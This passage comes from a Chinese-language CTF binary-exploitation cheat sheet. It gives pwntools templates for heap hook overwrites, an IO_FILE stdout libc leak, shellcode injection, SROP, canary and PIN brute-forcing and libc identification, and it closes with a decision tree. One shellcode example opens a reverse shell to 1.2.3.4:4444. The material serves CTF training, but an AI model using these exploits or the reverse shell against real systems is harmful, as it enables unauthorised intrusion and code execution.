alloc(0x40, p64(libc.symbols['system']))   # idx 10 -> __free_hook = system

# 触发：free 一个内容为 "/bin/sh" 的 chunk
alloc(0x40, b'/bin/sh\x00')         # idx 11
free(11)
io.interactive()
```

### 6. IO_FILE 利用（_IO_2_1_stdout_ 泄漏 libc）

无 puts/printf 输出函数时，改写 stdout 结构体 leak libc。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='info')

io = process('./pwn')
libc = ELF('./libc.so.6')

# 假设已有任意写原语：write(addr, 8_bytes)
def write(addr, data):
    io.sendlineafter(b'addr: ', hex(addr).encode())
    io.sendlineafter(b'data: ', data.hex().encode())

# stdout 偏移：libc.symbols['_IO_2_1_stdout_']
stdout = libc.symbols['_IO_2_1_stdout_']
# 伪造 flags = 0xfbad1800，_IO_write_base 低字节改 \x00 触发输出
flags = 0xfbad1800
write(stdout, p64(flags))
# 改 write_base 末字节为 0，让它从头开始输出
write(stdout + 0x20, p64(0))            # _IO_write_base
io.recvuntil(b'\x7f')
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
log.success(f"libc base = {hex(libc_base)}")

# 接下来任意写 __free_hook / __malloc_hook 即可
```

### 7. shellcode 生成与注入

NX 关闭时直接注入执行。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='info')

elf = ELF('./pwn')
io  = process('./pwn')

# ---- 1. 标准 /bin/sh ----
sc = asm(shellcraft.sh())
# shellcraft.sh() == execve('/bin/sh', 0, 0)

# ---- 2. 读 flag 文件 ----
sc2 = asm(shellcraft.cat('/flag'))

# ---- 3. 反弹 shell（攻击机监听 1.2.3.4:4444）----
sc3 = asm(shellcraft.connect('1.2.3.4', 4444) + shellcraft.dupsh())

# ---- 4. 自定义 syscall ----
# read(0, buf, 0x100) 然后跳回 buf
buf = 0x10000
sc4  = asm(f"""
    mov rdi, 0
    mov rsi, {buf}
    mov rdx, 0x100
    mov rax, 0
    syscall
    jmp {buf}
""")

offset = 0x40 + 8                    # buf + saved rbp
payload = b'A' * offset + p64(buf) + sc4
io.sendline(payload)
io.interactive()
```

### 8. SROP（SigreturnFrame）

用 `SigreturnFrame` 伪造信号 frame 控制所有寄存器。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='info')

elf  = ELF('./pwn')
libc = ELF('./libc.so.6')
io   = process('./pwn')

# 需要：一个 syscall; ret gadget 和一个 mov rax, 0xf; syscall 用于触发 sigreturn
syscall_addr = 0x401200
# 触发 sigreturn 需 rax=0xf
frame = SigreturnFrame()
frame.rax = 59                         # execve
frame.rdi = next(libc.search(b'/bin/sh'))
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x601000
frame.rip = syscall_addr

# 栈溢出：先设 rax=0xf 再 syscall 进入 SigreturnFrame
payload  = b'A' * 72
payload += p64(0x4011ff)              # mov rax, 0xf ; ret  (找的 gadget)
payload += p64(syscall_addr)          # syscall -> sigreturn
payload += bytes(frame)
io.sendline(payload)
io.interactive()
```

### 9. 多 libc 模糊匹配（libc-database 风格）

泄露 puts/printf 等多个函数低位地址，自动匹配 libc 版本。

```python
#!/usr/bin/env python3
"""
根据泄露的多个 libc 函数地址末 3 位反查 libc 版本。
配合 https://libc.rip 或本地 libc-database 使用。
"""
import requests

# 泄露到的函数地址（末 12 位足够）
leaks = {
    'puts':   0x7f1234567a30 & 0xfff,
    'printf': 0x7f12345a5e80 & 0xfff,
}

# 方式1: 调用 libc.rip API
r = requests.post('https://libc.rip/api/find', json={
    'symbols': {k: hex(v) for k, v in leaks.items()}
})
for lib in r.json():
    print(lib['id'], lib['download_url'])
# 输出第一个匹配，下载对应 libc，pwntools ELF 加载后计算 system / bin_sh 偏移
```

### 10. 自动化模板爆破器（canary / PIE 单字节爆破）

```python
#!/usr/bin/env python3
"""逐字节爆破 canary（fork 型题目，canary 不变）"""
from pwn import *
context(arch='amd64', log_level='warning')

io = remote(HOST, PORT)              # fork-server，父子 canary 相同

def try_byte(known, pos):
    io.sendline(b'A' * 8 + known + bytes([pos]))
    # 父进程靠子进程是否 crash 判断 canary 字节是否正确
    resp = io.recv(timeout=1)
    return b'try again' in resp or b'>' in resp     # 题目对错提示

canary = b'\x00'                      # canary 末字节恒为 \x00
for i in range(1, 8):
    for b in range(256):
        if try_byte(canary, b):
            canary += bytes([b])
            print(f"canary[{i}] = {hex(b)}")
            break
log.success(f"canary = {hex(u64(canary))}")
```

### 11. 通用爆破：4 位 PIN / 短验证码

```python
#!/usr/bin/env python3
"""4 位数字 PIN 爆破（适用题目设置每次校验、无锁定机制）"""
from pwn import *

io = remote(HOST, PORT)
for pin in range(10000):
    io.recvuntil(b'PIN: ')
    io.sendline(f"{pin:04d}".encode())
    resp = io.recvline(timeout=1)
    if b'correct' in resp or b'success' in resp:
        log.success(f"PIN = {pin:04d}")
        io.interactive()
        break
log.failure("not found")
```

### 12. 交互式 Shell 稳定化

拿到 shell 后 `python -c 'import pty;pty.spawn("/bin/bash")'` 升级 PTY。

```python
#!/usr/bin/env python3
"""拿到 sh 后升级为完整 TTY 交互 shell"""
from pwn import *
io = process('./pwn')
# ... getshell 后
io.sendline(b'python3 -c "import pty;pty.spawn(\'/bin/bash\')"')
io.sendline(b'export TERM=xterm')
io.sendline(b'stty raw -echo')        # 本端也需配置
io.interactive()
```

### 13. patchelf 切换 libc 一键脚本

```python
#!/usr/bin/env python3
"""远程题目用题目给的 libc，本地 patchelf 一键替换"""
import subprocess
from pwn import *

LIBC = './libc-2.31.so'
LD   = './ld-2.31.so'
BIN  = './pwn'

subprocess.run(['patchelf', '--set-interpreter', LD, BIN], check=True)
subprocess.run(['patchelf', '--replace-needed', 'libc.so.6', LIBC, BIN], check=True)
log.success("patched, run with: ./pwn")

# 运行时指定，不修改二进制
# io = process(BIN, env={'LD_PRELOAD': LIBC})
```

### 14. GDB 脚本辅助：自动断点 + leak 检查

```python
#!/usr/bin/env python3
"""gdb.debug 自动断点 + 运行中查看寄存器/内存"""
from pwn import *
context(arch='amd64', terminal=['tmux', 'splitw', '-h'])

gdbscript = '''
b *0x401234
b *main+0x50
commands 1
    x/20gx $rsp
    info registers rdi rsi rdx
    continue
end
continue
'''
io = gdb.debug('./pwn', gdbscript=gdbscript)
io.interactive()
```

### 15. 动态获取 libc 版本（`libc.blukat.me` 风格）

```python
#!/usr/bin/env python3
"""输入泄露的函数:地址，从 https://libc.rip 在线匹配"""
import sys, requests

leaks = {
    'puts':   0x7f1234567a30,
    'printf': 0x7f12345a5e80,
}
# 仅取末 12 位作为指纹
symbols = {k: hex(v & 0xfff) for k, v in leaks.items()}
r = requests.post('https://libc.rip/api/find', json={'symbols': symbols})
candidates = r.json()
if not candidates:
    print("no match"); sys.exit(1)
lib = candidates[0]
base = leaks['puts'] - int(lib['symbols']['puts'], 16)
system = base + int(lib['symbols']['system'], 16)
print(f"libc base = {hex(base)}")
print(f"system    = {hex(system)}")
```

---

## 十七、实战流程决策树

拿到一道 PWN 题后按以下顺序判断与决策：

```text
1. checksec ./pwn
   ├─ NX 关闭     → 直接 shellcode 注入（见 16.7）
   ├─ Canary 开   → 需 leak canary（见 16.3）或格式化字符串读
   ├─ PIE 开      → 必须 leak 一个真实地址算 elf.address（见 16.4）
   └─ Full RELRO  → 不能改 GOT，转 __free_hook / __malloc_hook / IO_FILE（见 16.6）

2. IDA 看漏洞函数
   ├─ gets/scanf   → 栈溢出，cyclic 测偏移 → ret2win / ret2libc（见 16.1）
   ├─ printf(buf)  → 格式化字符串，测偏移 → 任意写任意读（见 16.2）
   ├─ malloc/free  → 堆题，按 libc 版本选 tcache/fastbin/unsorted（见 16.5）
   └─ read 精确长度 → 栈溢出，注意 read 无需 \n（用 send 不用 sendline）

3. 无输出函数（puts/printf 都没有）
   └─ 用 IO_FILE 伪造 stdout 主动 leak（见 16.6）或 SROP（见 16.8）

4. fork 型服务器（父子共享 canary）
   └─ 逐字节爆破 canary（见 16.10）

5. 远程 libc 未知
   └─ leak 多个函数末 3 位 → libc.rip 在线匹配（见 16.9 / 16.15）→ patchelf 切换本地测（见 16.13）
```<tool_call>read<arg_key>filePath</arg_key><arg_value>D:\work\ai_blog\cyber_security\ctf_scripts
